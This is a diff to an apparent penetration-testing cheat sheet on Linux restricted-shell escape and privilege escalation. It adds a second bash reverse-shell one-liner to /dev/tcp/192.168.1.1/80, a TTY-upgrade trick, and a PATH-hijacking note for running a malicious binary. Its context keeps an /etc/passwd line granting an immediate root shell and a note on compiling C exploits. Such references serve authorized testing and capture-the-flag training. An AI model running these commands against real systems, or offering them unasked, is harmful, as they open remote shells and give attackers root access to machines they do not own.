@@ -21,6 +21,19 @@ https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
 
 Start bash instance:
 > /bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1
+> /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1'
+
+```
+
+###### Trick to improve a crappy shell
+```
+CTRL + Z out of the shell. Then:
+> stty raw -echo
+> fg
+Back in the shell, run:
+> reset
+More in-depth explanation:
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 ```
 
 ###### Sudo -l
@@ -51,18 +64,21 @@ Add this line to /etc/passwd (get immediate root shell)
 username:$1$ignite$tTBj87JPlfWJIFioYSmpC0:0:0:root:/root:/bin/bash
 ```
 
+###### Path Hijacking
+```
+Add a value of a directory to path, put it in the front so this will be used first, before the real path of the service. Then you can make a malicious service with the same name in the added path, and that will run instead.
+
+> path =/tmp:$PATH
+> echo $PATH
+```
+
 ###### GTFObins
 ```
 https://gtfobins.github.io/
 ```
 
-###### CVE-2021-3156 (Sudo exploit)
-```
-64bit
-https://github.com/worawit/CVE-2021-3156
-```
 
-####### Compiling C Exploits
+###### Compiling C Exploits
 ```
 > gcc exploit.c -o exploit
 Installing gcc libraries for cross compiling
